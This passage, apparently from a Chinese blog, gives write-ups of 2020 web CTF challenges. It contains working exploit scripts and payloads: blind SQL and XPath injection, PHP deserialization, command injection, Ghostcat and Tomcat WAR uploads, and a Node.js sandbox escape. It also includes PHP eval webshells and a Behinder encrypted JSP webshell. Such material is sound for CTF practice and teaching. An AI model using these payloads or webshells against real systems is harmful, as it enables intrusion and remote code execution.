158763206&#125;, &#39;&#39;, algorithm=&#39;none&#39;))#eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMzQ1NiIsImlhdCI6MTU4NzYzMjA2fQ.</code></pre><p>然后直接访问 /api/flag 就行了</p><h2 id="HFCTF2020-BabyUpload"><a href="#HFCTF2020-BabyUpload" class="headerlink" title="[HFCTF2020]BabyUpload"></a>[HFCTF2020]BabyUpload</h2><p><strong>文件上传</strong></p><p>要想拿到 flag 需要满足以下条件</p><pre><code>if($_SESSION[&#39;username&#39;] ===&#39;admin&#39;)&#123;    $filename=&#39;/var/babyctf/success.txt&#39;;    if(file_exists($filename))&#123;            safe_delete($filename);            die($flag);    &#125;&#125;</code></pre><p>所以我们需要伪造 admin 然后再创建一个 success.txt 文件</p><p>看看代码逻辑，sess 文件存储在根目录，令 attr=. 就可以读取当前目录，文件名则为 sess_PHPSESSID，刚好文件的命名方式为 ‘文件名’ + ‘_’ + ‘文件内容哈希值’，所以满足伪造 admin 的条件，首先我们先读一下 sess 文件是用什么存储引擎的</p><pre><code>import requests as rqurl = &quot;http://91291e0d-960a-4f9c-91e0-c6f251ca14e1.node3.buuoj.cn/&quot;data = &#123;&quot;filename&quot;:&quot;sess_c82aa666b4f44ff16a6e88bdd1fb6d1d&quot;,&quot;attr&quot;:&quot;.&quot;,&quot;direction&quot;:&quot;download&quot;&#125;res = rq.post(url, data=data)print(res.text)</code></pre><p>返回 sess 文件的内容是</p><pre><code>usernames:5:&quot;guest&quot;;</code></pre><p>可以推测起采用的存储引擎是<code>php_binary</code>，本地自己生成一个 sess 文件</p><pre><code>&lt;?php    ini_set(&#39;session.serialize_handler&#39;, &#39;php_binary&#39;);    session_start();    $_SESSION[&#39;name&#39;] = &#39;admin&#39;;?&gt;</code></pre><p>打开自己的 php.ini 看看 session.save_path 在哪里，用十六进制打开文件我们可以看到 username 前面其实还有一个不可见字符<code>0x08</code>，它表示的是 username 的长度，所以在传文件时，我们需要注意这个不可见字符</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527110924.png" alt="image-20200518180309624"></p><p>所以上传 sess 文件，所以文件名</p><pre><code>import requests as rqimport hashliburl = &quot;http://91291e0d-960a-4f9c-91e0-c6f251ca14e1.node3.buuoj.cn/&quot;files = &#123;&quot;up_file&quot;: (&quot;sess&quot;, &#39;\x08usernames:5:&quot;admin&quot;;&#39;)&#125;data = &#123;&quot;attr&quot;:&quot;.&quot;,&quot;direction&quot;:&quot;upload&quot;&#125;res = rq.post(url, data=data, files=files)print(res.text)PHPSSID = hashlib.sha256(b&#39;\x08usernames:5:&quot;admin&quot;;&#39;).hexdigest()print(f&#39;filename: sess_&#123;PHPSSID&#125;&#39;)</code></pre><p><code>file_exists</code>可以判断文件或目录是否存在，所以这里把 attr 改成 success.txt 即可</p><pre><code>import requests as rqfiles = &#123;&quot;up_file&quot;: (&quot;kk&quot;, &#39;hack&#39;)&#125;data = &#123;&quot;attr&quot;:&quot;success.txt&quot;,&quot;direction&quot;:&quot;upload&quot;&#125;res = rq.post(url, data=data, files=files)print(res.text)</code></pre><p>带上 admin 的 cookie 就可以看到 flag 了</p><h2 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h2><p><strong>异或盲注</strong></p><p>有一个查询接口，简单测试可以发现</p><pre><code>?stunum=1^1^1 =&gt; Hi admin, your score is: 100?stunum=1^0^1 =&gt; student number not exists.</code></pre><p>所以是布尔盲注，过滤了空格，祭出老脚本</p><pre><code>from multiprocessing import Pool, Managerimport requests, timedef func(index, results):    l = 0    r = 127    m = (l+r)//2    while l&lt;r:        url = &#39;http://c890296e-d508-471e-b89c-1dc73859c8a4.node3.buuoj.cn&#39;        payload = f&quot;1^(ascii(mid((select/**/value/**/from/**/flag),&#123;index + 1&#125;,1))&gt;&#123;m&#125;)^1&quot;        time.sleep(0.5)        paramsGet = &#123;&quot;stunum&quot;:payload&#125;        res = requests.get(url, params=paramsGet)        if &#39;admin&#39; in res.text:            l = m + 1        else:            r = m        m = (l + r) // 2    print(index + 1, m)    results[index] = mif __name__ == &quot;__main__&quot;:    num = 5    data_num = 50    data = range(data_num)    pool = Pool(processes=num)    manager = Manager()    results = manager.list([0]*data_num)    jobs = []    for d in data:        job = pool.apply_async(func, (d, results))        jobs.append(job)    pool.close()    pool.join()    print(results)    results = &#39;&#39;.join([chr(_) for _ in results])    print(results)</code></pre><h2 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h2><p><strong>代码审计</strong></p><p>robots.txt 信息泄露</p><pre><code>User-agent: *Disallow: /fAke_f1agggg.php</code></pre><p>访问一下响应头有东西</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111232.png" alt="image-20200526171751316"></p><p>然后是个代码审计</p><pre><code>&lt;?phpheader(&#39;Content-type:text/html;charset=utf-8&#39;);error_reporting(0);highlight_file(__file__);//level 1if (isset($_GET[&#39;num&#39;]))&#123;    $num = $_GET[&#39;num&#39;];    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123;        echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;;    &#125;else&#123;        die(&quot;金钱解决不了穷人的本质问题&quot;);    &#125;&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;//level 2if (isset($_GET[&#39;md5&#39;]))&#123;   $md5=$_GET[&#39;md5&#39;];   if ($md5==md5($md5))       echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;;   else       die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;//get flagif (isset($_GET[&#39;get_flag&#39;]))&#123;    $get_flag = $_GET[&#39;get_flag&#39;];    if(!strstr($get_flag,&quot; &quot;))&#123;        $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);        echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;;        system($get_flag);    &#125;else&#123;        die(&quot;快到非洲了&quot;);    &#125;&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;?&gt;</code></pre><p>第一层可以利用十六进制绕过 <code>intval</code> ，intval(str)为0，但是intval(str+1) 会自动转换成数值</p><blockquote><p>php7里面修复了这个漏洞</p></blockquote><pre><code>num=0x1234</code></pre><p>第二层 md5 双哈希为 0e 绕过，检索一下就有了</p><p><a href="http://wh4lter.icu/2017/10/15/php_MD5/">http://wh4lter.icu/2017/10/15/php_MD5/</a></p><p>当然你也可以采用脚本爆破（不推荐，十分漫长）</p><pre><code>import hashlib, vthread@vthread.pool(100)def find(v):    v = (&#39;0e&#39; + str(v)).encode()    vv = hashlib.md5(v).hexdigest()    if vv[:2] == &#39;0e&#39; and vv[2:].isdigit():        print(&#39;[+] find&#39;, v, vv)for i in range(int(1e8), int(1e10)):    find(i)</code></pre><p>随便拿一个</p><pre><code>md5=0e00275209979</code></pre><p>第三层空格用 <code>$&#123;IFS&#125;</code>，命令直接用斜杠绕过</p><pre><code>get_flag=ca\t$&#123;IFS&#125;fll*</code></pre><h2 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2><p><strong>文件上传</strong></p><p>诶 注册登录随便传个马就 getshell 了</p><pre><code>&lt;script language=&#39;php&#39;&gt;@eval($_REQUEST[&#39;1&#39;]);&lt;/script&gt;</code></pre><p>连上去 ?1=system(‘cat /*’); 就行了</p><h2 id="WUSTCTF2020-easyweb"><a href="#WUSTCTF2020-easyweb" class="headerlink" title="[WUSTCTF2020]easyweb"></a>[WUSTCTF2020]easyweb</h2><p><strong>幽灵猫漏洞</strong></p><p>随意上传文件就可以进行下载，得到任意读文件接口</p><pre><code>/download?file=</code></pre><p>报错得出了路径</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111428.png" alt="image-20200522213124031"></p><p>但是 uploads 目录并不能访问</p><p>查看 web.xml 发现使用了 tomcat.ajp 协议</p><p> <img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111434.png" alt="image-20200522213604609"></p><p>联想到用幽灵猫漏洞进行文件包含从而执行命令</p><p><a href="https://github.com/00theway/Ghostcat-CNVD-2020-10487">https://github.com/00theway/Ghostcat-CNVD-2020-10487</a></p><p>先获取靶机的内网地址</p><pre><code>/download?file=../../../../../../../etc/hosts</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111438.png" alt="image-20200522212808809"></p><p>上传可以命令执行的 js 文件</p><pre><code>&lt;%@ page import=&quot;java.util.*,java.io.*&quot;%&gt;&lt;% out.println(&quot;Executing command&quot;);Process p = Runtime.getRuntime().exec(&quot;ls /&quot;);OutputStream os = p.getOutputStream();InputStream in = p.getInputStream();DataInputStream dis = new DataInputStream(in);String disr = dis.readLine();while ( disr != null ) &#123;  out.println(disr);   disr = dis.readLine(); &#125;%&gt;</code></pre><p>开一个 Linux Labs 运行 ajpShooter.py 执行命令执行</p><pre><code>python3 ajpShooter.py http://174.1.115.127 8009 /WEB-INF/uploads/fe845d95-805e-4fb7-aac3-7bcca4c935ba.jsp eval</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111442.png" alt="image-20200522212736292"></p><p>后面直接 cat /flag* 就好了</p><h2 id="WUSTCTF2020-Train-Yourself-To-Be-Godly"><a href="#WUSTCTF2020-Train-Yourself-To-Be-Godly" class="headerlink" title="[WUSTCTF2020]Train Yourself To Be Godly"></a>[WUSTCTF2020]Train Yourself To Be Godly</h2><p><strong>tomcat</strong></p><blockquote><p>参考 <a href="https://imagin.vip/?p=1323">https://imagin.vip/?p=1323</a> 文章</p></blockquote><p>打开是一个 tomcat 界面，报错现在当前目录在 examples</p><p>利用 Nginx 和 Tomcat 对某些标点解析的差异性进行目录穿越，进入后台页面</p><pre><code>http://dcf11651-b9f9-4e12-80ed-038dbf7c34fb.node3.buuoj.cn/..;/manager/html</code></pre><p>后台默认密码是  tomcat / manager</p><p>这里是利用弱口令  tomcat / tomcat</p><p>后面就是熟悉的 war 上传 webshell 了</p><p>上一个冰蝎的 shell</p><pre><code>&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if(request.getParameter(&quot;pass&quot;)!=null)&#123;String k=(&quot;&quot;+UUID.randomUUID()).replace(&quot;-&quot;,&quot;&quot;).substring(16);session.putValue(&quot;u&quot;,k);out.print(k);return;&#125;Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%&gt;</code></pre><p>生成 war 包</p><blockquote><p>或者打包成 zip 然后改成 war</p></blockquote><pre><code>jar cvf exp.war shell.jsp</code></pre><p>直接上传会 404，因为路径会再添加一个 examples</p><p>修改路径后会出现 401，因为缺少了授权信息，需要我们自己添加 Authorization 头</p><pre><code>Authorization: Basic dG9tY2F0OnRvbWNhdA==</code></pre><p>添加后出现 403，这是因为我们比正常请求少了一个 cookie，在访问 <code>/manager/html/</code>  时我们会返回一个 cookie</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111449.png" alt="image-20200524183538086"></p><p>但是添加 cookie 后我们还是 403</p><p>正确方法把那个 Set-Cookie 的返回包抓回来修改 Path 就可以上传成功了</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111453.png" alt="image-20200524184430042"></p><p>上传成功</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111819.png" alt="image-20200524185133827"></p><p>冰蝎连上去 flag 在环境变量</p><blockquote><p>根目录也有 /flagggg</p></blockquote><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111458.png" alt="image-20200524194151982"></p><h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><p>**命令执行题目</p><p>一进去发现传参的参数是</p><pre><code>func=date&amp;p=Y-m-d+h%3Ai%3As+a</code></pre><p>随意修改 func 参数发现如下报错</p><pre><code>&lt;b&gt;Warning&lt;/b&gt;:  call_user_func() expects parameter 1 to be a valid callback, function &#39;dte&#39; not found or invalid function name in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;24&lt;/b&gt;&lt;br /&gt;</code></pre><p>所以这里就是命令注入了，试了几个命令被 waf 了</p><p>先读一下源码</p><pre><code>func=readfile&amp;p=index.php&lt;?php    $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);function gettime($func, $p) &#123;    $result = call_user_func($func, $p);    $a= gettype($result);    if ($a == &quot;string&quot;) &#123;        return $result;    &#125; else &#123;return &quot;&quot;;&#125;&#125;class Test &#123;    var $p = &quot;Y-m-d h:i:s a&quot;;    var $func = &quot;date&quot;;    function __destruct() &#123;        if ($this-&gt;func != &quot;&quot;) &#123;            echo gettime($this-&gt;func, $this-&gt;p);        &#125;    &#125;&#125;$func = $_REQUEST[&quot;func&quot;];$p = $_REQUEST[&quot;p&quot;];if ($func != null) &#123;    $func = strtolower($func);    if (!in_array($func,$disable_fun)) &#123;        echo gettime($func, $p);    &#125;else &#123;        die(&quot;Hacker...&quot;);    &#125;&#125;?&gt;</code></pre><p>显然这里给了一个反序列化的漏洞给我们，调用 unserialze 就可以触发没有经过过滤的 __destruct 函数了，payload 如下</p><blockquote><p>一开始找不到 flag，直接 find 一下就好</p></blockquote><pre><code>&lt;?phpfunction send_post($url, $post_data) &#123;    $postdata = http_build_query($post_data);    $options = array(        &#39;http&#39; =&gt; array(            &#39;method&#39; =&gt; &#39;POST&#39;,            &#39;header&#39; =&gt; &#39;Content-type:application/x-www-form-urlencoded&#39;,            &#39;content&#39; =&gt; $postdata,            &#39;timeout&#39; =&gt; 15 * 60         )    );    $context = stream_context_create($options);    $result = file_get_contents($url, false, $context);    return $result;&#125;class Test &#123;    // var $p = &quot;find / | grep flag -s&quot;;    var $p = &quot;cat /tmp/flagoefiu4r93&quot;;    var $func = &quot;system&quot;;&#125;$a = new Test();$p = serialize($a);$func = &quot;unserialize&quot;;$url = &quot;http://4a1bc0f2-7e1f-4309-ab6d-f72e46bcc64c.node3.buuoj.cn/index.php&quot;;$post_data = array(    &#39;func&#39; =&gt; $func ,    &#39;p&#39; =&gt; $p);echo send_post($url, $post_data);?&gt;</code></pre><h2 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h2><p><strong>nmap 老漏洞</strong></p><p>先打一个 127.0.0.1 试试，发现 nmap 完 ip 后会存储到一个 xml 文件里面，然后进行文件包含，首先我们需要知道 nmap 有部分文件读写的参数</p><pre><code># 读文件：TARGET SPECIFICATION:  -iL &lt;inputfilename&gt;: Input from list of hosts/networks# 写文件：OUTPUT:  -oN/-oX/-oS/-oG &lt;file&gt;: Output scan in normal, XML, s|&lt;rIpt kIddi3,     and Grepable format, respectively, to the given filename.  -oA &lt;basename&gt;: Output in the three major formats at once</code></pre><p>所以我们可以这样读文件</p><pre><code>127.0.0.1&#39; -iL /flag -oN kk.txt &#39;</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111511.png" alt="image-20200519162615497"></p><p>当然你还可以直接写 shell，这里 php 被过滤了，稍微用短标签和 phtml 绕过一下</p><pre><code>127.0.0.1&#39; &lt;?= @eval($_REQUEST[1]);?&gt; -oG kk.phtml &#39;</code></pre><h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p><strong>代码注入</strong></p><p>查看源码接口</p><pre><code>&lt;p&gt;百万前端的NPU报时中心为您报时：&lt;a href=&quot;./time.php?source&quot;&gt;&lt;/a&gt;&lt;/p&gt;&lt;?php#error_reporting(0);class HelloPhp&#123;    public $a;    public $b;    public function __construct()&#123;        $this-&gt;a = &quot;Y-m-d h:i:s&quot;;        $this-&gt;b = &quot;date&quot;;    &#125;    public function __destruct()&#123;        $a = $this-&gt;a;        $b = $this-&gt;b;        echo $b($a);    &#125;&#125;$c = new HelloPhp;if(isset($_GET[&#39;source&#39;]))&#123;    highlight_file(__FILE__);    die(0);&#125;@$ppp = unserialize($_GET[&quot;data&quot;]);</code></pre><p>常用的命令函数被 ban 了，但是 assert 没有，直接构造，flag 在 phpinfo 里</p><pre><code>?data=O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125;</code></pre><h2 id="NPUCTF2020-ezlogin"><a href="#NPUCTF2020-ezlogin" class="headerlink" title="[NPUCTF2020]ezlogin"></a>[NPUCTF2020]ezlogin</h2><p><strong>xpath注入 + 任意读文件</strong></p><p>查看 js 源码发现只有登陆成功就会跳到 admin.php，而且提交的数据是直接进行拼接的，猜测这里是 xpath 注入</p><pre><code>var data = &quot;&lt;username&gt;&quot;+username+&quot;&lt;/username&gt;&quot;+&quot;&lt;password&gt;&quot;+password+&quot;&lt;/password&gt;&quot;+&quot;&lt;token&gt;&quot;+token+&quot;&lt;/token&gt;&quot;; </code></pre><blockquote><p>不了解 xpath 可以先学习一下</p><p><a href="https://www.runoob.com/xpath/xpath-tutorial.html">https://www.runoob.com/xpath/xpath-tutorial.html</a></p><p>xpath 注入可以参考这篇文章</p><p><a href="https://www.tr0y.wang/2019/05/11/XPath注入指北/">https://www.tr0y.wang/2019/05/11/XPath注入指北/</a></p></blockquote><p>具体注入脚本如下</p><pre><code># coding:utf-8import requests as rqimport re, stringurl = &quot;http://f2f86738-985d-4624-abbf-4ddf7606133d.node3.buuoj.cn/&quot;cookies = &#123;&quot;PHPSESSID&quot;:&quot;478b12d3ea2eb03ae7a71cc867b05c08&quot;&#125;headers = &#123;&quot;Content-Type&quot;:&quot;application/xml&quot;&#125;path = &quot;/root/accounts/user[id=2]/password&quot;number = 0cnt = 1length = 0def get_token():    res = rq.get(url, cookies=cookies)    token = re.findall(r&#39;id=&quot;token&quot; value=&quot;(.+?)&quot;&#39;, res.text)[0]    return tokendef get_number():    index = 1    while True:        token = get_token()        username = &quot;&#39; or count(&#123;&#125;)=&#123;&#125; or &#39;1&quot;.format(path, index)        payload = &quot;&lt;username&gt;&#123;&#125;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;        data = payload.format(username, token)        res = rq.post(url + &quot;/login.php&quot;, headers=headers, data=data, cookies=cookies)        print(f&quot;[*] index: &#123;index&#125; &#123;res.text&#125;&quot;)        if &quot;非法操作!&quot; in res.text:            global number            number = index            print(f&quot;[+] number: &#123;index&#125;&quot;)            break        else:            index += 1def get_length():    index = 1    while True:        token = get_token()        username = &quot;&#39; or string-length(name(&#123;&#125;/*[&#123;&#125;]))=&#123;&#125; or &#39;1&quot;.format(path, cnt, index)        payload = &quot;&lt;username&gt;&#123;&#125;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;        data = payload.format(username, token)        res = rq.post(url + &quot;/login.php&quot;, headers=headers, data=data, cookies=cookies)        print(f&quot;[*] index: &#123;index&#125; &#123;res.text&#125;&quot;)        if &quot;非法操作!&quot; in res.text:            global length            length = index            print(f&quot;[+] length: &#123;index&#125;&quot;)            break        else:            index += 1def get_name():    name = &#39;&#39;    for index in range(1, length + 1):         for ch in string.printable:            token = get_token()            username = &quot;&#39; or substring(name(&#123;&#125;/*[&#123;&#125;]), &#123;&#125;, 1)=&#39;&#123;&#125;&#39; or &#39;1&quot;.format(path, cnt, index, ch)            payload = &quot;&lt;username&gt;&#123;&#125;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;            data = payload.format(username, token)            res = rq.post(url + &quot;/login.php&quot;, headers=headers, data=data, cookies=cookies)            print(f&quot;[*] index: &#123;index&#125; ch: &#123;ch&#125; &#123;res.text&#125;&quot;)            if &quot;非法操作!&quot; in res.text:                name += ch                print(f&quot;[+] name: &#123;flag&#125;&quot;)                breakdef get_vaule():    vaule = &#39;&#39;    index = 1    while True:        for ch in string.printable:            token = get_token()            username = &quot;&#39; or substring(&#123;&#125;, &#123;&#125;, 1)=&#39;&#123;&#125;&#39; or &#39;1&quot;.format(path, index, ch)            payload = &quot;&lt;username&gt;&#123;&#125;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;            data = payload.format(username, token)            res = rq.post(url + &quot;/login.php&quot;, headers=headers, data=data, cookies=cookies)            print(f&quot;[*] index: &#123;index&#125; ch: &#123;ch&#125; &#123;res.text&#125;&quot;)            if ch == string.printable[-1]:                print(f&quot;[+] vaule: &#123;vaule&#125;&quot;)                return            if &quot;非法操作!&quot; in res.text:                vaule += ch                index += 1                print(f&quot;[+] vaule: &#123;vaule&#125;&quot;)                break&#39;&#39;&#39;&lt;root&gt;    &lt;accounts&gt;        &lt;user&gt;            &lt;id&gt; 1 &lt;/id&gt;            &lt;username&gt; guest &lt;/id&gt;            &lt;password&gt; xxxx &lt;/password&gt;        &lt;/user&gt;        &lt;user&gt;            &lt;id&gt; 2 &lt;/id&gt;            &lt;username&gt; adm1n &lt;/username&gt;            &lt;password&gt; cf7414b5bdb2e65ee43083f4ddbc4d9f &lt;/password&gt;        &lt;/user&gt;    &lt;/accounts&gt;&lt;/root&gt;&#39;&#39;&#39;if __name__ == &quot;__main__&quot;:    # get_number()    # get_length()    # get_name()    get_vaule()</code></pre><p>拿去 somd5 破解一下得到 admin 密码 <code>adm1n:gtfly123</code> </p><p>进去之后拿到题是 flag 在 /flag，一看 url 显然是个任意读文件，/etc/passwd 读取成功，访问 /flag 显示返回的页面中含有敏感内容，php 和 base 被 waf，但是可以大小写绕过，payload 如下</p><pre><code>/admin.php?file=pHp://filter/convert.baSe64-encode/resource=/flag</code></pre><h2 id="NPUCTF2020-验证🐎"><a href="#NPUCTF2020-验证🐎" class="headerlink" title="[NPUCTF2020]验证🐎"></a>[NPUCTF2020]验证🐎</h2><p><strong>node.js</strong></p><p>查看源码</p><p>验证码的第一个逻辑</p><pre><code>first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])</code></pre><p>我们可以根据 js 中任意类型 + 字符串 = 字符串的特性绕过</p><pre><code>&#123;&quot;e&quot;:&quot;1&quot;,&quot;first&quot;:[0],&quot;second&quot;:&quot;0&quot;&#125;</code></pre><p>然后就是绕命令执行</p><p>{“e”:”1”,”first”:[0],”second”:”0”}</p><pre><code>function saferEval(str) &#123;  if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, &#39;&#39;)) &#123;    return null;  &#125;  return eval(str);&#125;</code></pre><p>这里是使用了 js 的箭头函数进行绕过，然后通过 constructor 导出 Function 函数，利用 fromCharCode 编写 exp</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111709.png" alt="image-20200523230936254"></p><p>最后参照官方 payload 写出</p><pre><code>import requests as rqimport redef gen(cmd):    s = f&quot;return process.mainModule.require(&#39;child_process&#39;).execSync(&#39;&#123;cmd&#125;&#39;).toString()&quot;    return &#39;,&#39;.join([str(ord(i)) for i in s])url = &quot;http://b8c28475-b09e-4632-9fc7-cf582bde39f0.node3.buuoj.cn/&quot;headers = &#123;&quot;Connection&quot;:&quot;close&quot;,&quot;Content-Type&quot;:&quot;application/json&quot;&#125;cookies = &#123;&quot;PHPSESSION&quot;:&quot;eyJhZG1pbiI6MCwicmVzdWx0cyI6W119&quot;,&quot;PHPSESSION.sig&quot;:&quot;dOk8zRUiKwDaXbIyGNaaZdAmC9k&quot;&#125;cmd = &quot;cat /flag&quot;payload = &#39;((Math)=&gt;(Math=Math.constructor,Math.constructor(Math.fromCharCode(&#123;&#125;))))(Math+1)()&#39;.format(gen(cmd))data = &#39;&#123;&quot;e&quot;:&quot;%s&quot;,&quot;first&quot;:[0],&quot;second&quot;:&quot;0&quot;&#125;&#39; % (payload)res = rq.post(url, data=data, cookies=cookies, headers=headers)flag = re.findall(r&#39;&lt;div id=&quot;res&quot;&gt;([\s\S]+?)&lt;/div&gt;&#39;, res.text)[0].strip()print(flag)</code></pre><h2 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h2><p><strong>哈希长度拓展攻击 + php7 文件包含</strong></p><p>源码提示如下</p><pre><code>&lt;!--md5($secret.$name)===$pass --&gt;</code></pre><p>是个哈希长度拓展攻击的典型代码，这里不知道 secret 的长度，所以需要爆破</p><blockquote><p>hashpumpy 的安装在 Windows 上需要  Microsoft Visual C++ 14.0</p><p>不想安装的朋友请移步 Linux</p></blockquote><p>爆了很久发现根本爆破不了（x</p><p>看了看别人的题解据说是出题人出错了，填入 name 和 pass，然后用 cookie 的 hash 值替换一下 pass 就可以了：）</p><pre><code>?name=1&amp;pass=576322dd496b99d07b5b0f7fa7934a25</code></pre><p>抓包发现它会跳转到一个 flflflflag.php，然后再跳转到 404.html，flflflflag.php 处有个文件包含</p><pre><code>&lt;html&gt;&lt;head&gt;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;           window.location.href=&quot;404.html&quot;;&lt;/script&gt;&lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;/title&gt;&lt;/head&gt;&lt;&gt;&lt;body&gt;include($_GET[&quot;file&quot;])&lt;/body&gt;&lt;/html&gt;</code></pre><p>读不到常规 flag，所以我们需要命令执行，所以我们需要有个地方上传文件，读一下它的源码过滤了 data|input|zip 协议</p><pre><code>?file=php://filter/convert.base64-encode/resource=flflflflag.php&lt;html&gt;&lt;head&gt;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;           window.location.href=&quot;404.html&quot;;&lt;/script&gt;&lt;title&gt;this_is_not_fl4g_and_å•ºé¢•äºº_wants_girlfriend&lt;/title&gt;&lt;/head&gt;&lt;&gt;&lt;body&gt;&lt;?php$file=$_GET[&#39;file&#39;];if(preg_match(&#39;/data|input|zip/is&#39;,$file))&#123;    die(&#39;nonono&#39;);&#125;@include($file);echo &#39;include($_GET[&quot;file&quot;])&#39;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>这里是会用到了 php7 的一个 bug，php 包含自身导致死循环的时候，同时上传一个文件，这个文件会得到保存，参考如下链接</p><p><a href="https://www.jianshu.com/p/dfd049924258">https://www.jianshu.com/p/dfd049924258</a></p><p>这里为了降低难度给了一个 dir.php</p><pre><code>&lt;?phpvar_dump(scandir(&#39;/tmp&#39;));?&gt;</code></pre><p>顺便看了眼别人的 wp，flag 在 phpinfo，所以最终 payload 如下</p><pre><code>import requests as rqfrom io import BytesIOimport reurl  = &quot;http://3976dcb8-83fd-4f63-9f84-1fb9ab24c6bd.node3.buuoj.cn/&quot;# upload payloadpayload = &quot;&lt;?php phpinfo() 